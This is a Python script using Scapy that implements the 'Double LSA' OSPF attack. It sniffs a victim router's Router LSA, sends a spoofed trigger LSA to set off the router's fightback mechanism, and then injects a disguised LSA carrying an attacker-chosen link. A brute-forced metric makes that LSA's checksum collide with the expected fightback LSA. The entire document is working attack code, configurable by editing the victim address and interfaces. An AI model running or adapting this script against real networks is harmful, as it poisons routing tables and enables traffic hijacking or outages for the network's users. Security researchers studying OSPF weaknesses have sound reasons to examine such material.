#! /usr/bin/env python
"""
Double LSA OSPF Attack
Author:	Alston 					  
Date:	2020.7.10   
"""

from scapy.all import *
from time import *


#####################################################
# Utils functions		 							#
#####################################################

"""
Checks if the incoming packet is an OSFP LS Update packet sent from the victim router.
"""
def check_incoming_packet(victim, pkt):
	if OSPF_Router_LSA in pkt:
		for lsa in pkt[OSPF_LSUpd].lsalist:
			if lsa[OSPF_Router_LSA].adrouter == victim:
				return True
	return False

"""
Returns the last index of the victim router LSA taken from the originally captured packet
"""
def get_victim_lsa_index(victim, pkt):
	position = 0
	if OSPF_Router_LSA in pkt:
		for lsa in pkt[OSPF_LSUpd].lsalist:
			if lsa[OSPF_Router_LSA].adrouter == victim:
				break
			position += 1
	return position

"""
This function calculates the value of the first and the second byte in the 
OSPF Link "metric" field, used to fake the checksum.
"""
def get_fake_metric_value(fightback_lsa, evil_lsa, linkcount):

	tmp_lsa = evil_lsa[OSPF_Router_LSA].copy()
	fightback_checksum = ospf_lsa_checksum(fightback_lsa.build())

	"""
	Ok guys, I have no enough time here to understand how to do it in a cool and fancy
	way with numpy. So, fuck, let's bruteforce it (using 65535 cycles, in the worst case).
	"""
	for metric in range (0,65535):
		tmp_lsa[OSPF_Router_LSA].linklist[linkcount].metric = metric
		tmp_checksum = ospf_lsa_checksum(tmp_lsa.build())

		if tmp_checksum == fightback_checksum:
			return metric

	return 0

if __name__ == '__main__':

	"""
    Load the Scapy's OSPF module
    """
	load_contrib("ospf")
	
	#####################################################
	# Initial configuration 							#
	#####################################################
	
	"""
	The router-id of the victim router
	"""
	victim = "192.168.35.105"

	print("[+] Staring sniffing for LSUpdate from the victim's router...")

	#####################################################
	# Sniffing for the original package					#
	#####################################################
	"""
	Sniff all the OSFP packets and stop when the first OSPF Router LSA is received from the victim router.
	"""
	pkts = sniff(filter="proto ospf", stop_filter=lambda x: check_incoming_packet(victim, x))

	#pkts[-1].show()

	"""
	Get the last packet and copy it.
	"""
	pkt_orig = pkts[-1].copy()

	#####################################################
	# Prepare the triggering packet 					#
	#####################################################
	print("[+] Preparing trigger packet...")

	"""
	We prepare an trigger packet containing only one Router LSA:
	this is taken from the original package sent by the victim router.
	"""
	pkt_trig = pkts[-1].copy()
	victim_lsa_index = get_victim_lsa_index(victim, pkt_orig)

	"""
	To be effective, the sequence of the trigger LSA has to be increased by 1.
	"""
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].seq += 1
	
	"""
	Here we insert a random link, just to create an LSUpdate which seems advertised
	by the victim router, but which contains fake information. This will force the
	victim router to trigger the fightback mechanism.
	"""
	trigger_link = OSPF_Link(	metric=10,
								toscount=0,
								type=3,
								data= "255.255.255.0",
								id= "172.16.66.0")

	"""
	Addition of the triggering OSPF Link in the trigger packet.
	"""	
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(trigger_link)

	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12 
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = \
	len(pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)

	"""
	Now that the packet is ready, we let Scapy recalculate length, checksums, etc..
	Moreover, we update the source and destionatio IPs, and the source IP in the OSPF
	header.
	"""
	# pkt_trig[Ether].src = "00:16:3e:0b:16:1e"
	# pkt_trig[Ether].dst = "01:00:5e:00:00:05"	# The multicast MAC address
	pkt_trig[IP].src = "192.168.12.79"	
	pkt_trig[IP].dst = "224.0.0.5"	
	pkt_trig[IP].chksum = None
	pkt_trig[IP].len = None
	pkt_trig[OSPF_Hdr].src = victim
	pkt_trig[OSPF_Hdr].chksum = None
	pkt_trig[OSPF_Hdr].len = None
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len = None
	pkt_trig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].chksum = None

	#####################################################
	# Prepare the disguised packet 						#
	#####################################################
	print("[+] Preparing disguised packet...")

	"""
	Get a fresh copy of the original packet.
	"""
	pkt_evil = pkts[-1].copy()

	"""
	Generate the disguised LSA. This is an example, change it accordingly to your goal.
	"""
	malicious_link = OSPF_Link(	metric=10,
								toscount=0,
								type=3,
								data= "255.255.255.0",
								id= "172.16.254.0")
	"""
	Addition of the malicious OSPF Link in the LSA_disguised packet.
	"""
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(malicious_link)

	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12 	
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = \
	len(pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)

	"""
	The sequence number of the packet evil is incremented by 2 because
	the trigger sequence is equal to the original packet sequence, plus one.
	It then triggers the fightback mechanism, which produces a packet with
	the sequence number equal to the trigger's sequence number, plus one.
	"""
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].seq += 2

	#####################################################
	# Calculate the disguised packet 					#
	#####################################################
	print("[+] Let's bruteforce the checksum!")

	"""
	Preparing the OSPF Link to fake the checksum.
	"""
	checksum_link = OSPF_Link(	metric=0,
								toscount=0,
								type=3,
								data= "255.255.255.0",
								id= "172.16.253.0")

	"""
	Addition of an OSPF Link in the LSA_disguised packet in order to change the checksum later.
	"""
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist.extend(checksum_link)

	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].len += 12
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount = \
	len(pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist)

	"""
	ORIGINAL SOLUTION:
	Get the value to modify the dummy link in order to have the same checksum as the fight back
	index of the dummy link - "metric":[1], "Tos":[3], "type":[4], "link_data":[5,6,7,8], "DR":[9,10,11,12]
	For example ind = [1,4], val = [49,12] -> metric = 49 and type =12
	IMPROVED SOLUTION:
	Due to the fact that the metric is 2 bytes long and that C0 and C1 are always evaluated as mod(255),
	there is no need to change all the other parameters.
	"""
	count = pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linkcount - 1

	pkt_orig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].seq += 2

	faked_metric =  get_fake_metric_value(pkt_orig[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA], \
										  pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA], count)

	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].linklist[count][OSPF_Link].metric = faked_metric

	print("[+] Collision found! Time to send the pkts...")
	
	"""
	Now that the packet is ready, we let Scapy recalculate length, checksums, etc..
	"""
	# pkt_evil[Ether].src = "00:16:3e:3a:a7:11"
	# pkt_evil[Ether].dst = "01:00:5e:00:00:05"
	pkt_evil[IP].src = "192.168.16.130"
	pkt_evil[IP].dst = "224.0.0.5"
	pkt_evil[IP].chksum = None
	pkt_evil[IP].len = None
	pkt_evil[OSPF_Hdr].chksum = None
	pkt_evil[OSPF_Hdr].len = None
	pkt_evil[OSPF_LSUpd].lsalist[victim_lsa_index][OSPF_Router_LSA].chksum = None

	"""
	Send trigger packet to trigger the fightback mechanism
	"""
	sendp(pkt_trig, iface='eth1')
	# sendp(pkt_trig, iface='eth0')
	sleep(2)
	sendp(pkt_evil, iface='eth0')

